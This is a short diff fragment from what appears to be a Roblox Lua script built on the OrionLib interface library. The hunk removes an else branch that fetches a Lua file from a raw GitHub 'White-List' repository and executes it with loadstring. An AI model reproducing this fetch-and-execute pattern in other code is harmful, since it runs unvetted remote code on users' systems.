@@ -300,6 +300,3 @@ Info:AddParagraph("Why did i make this?","Im extremely bored and have nothing to
 
 OrionLib:Init()
 end
-else
-loadstring(game:HttpGet("https://raw.githubusercontent.com/YourMomClapped/White-List/main/.lua"))()
-     end
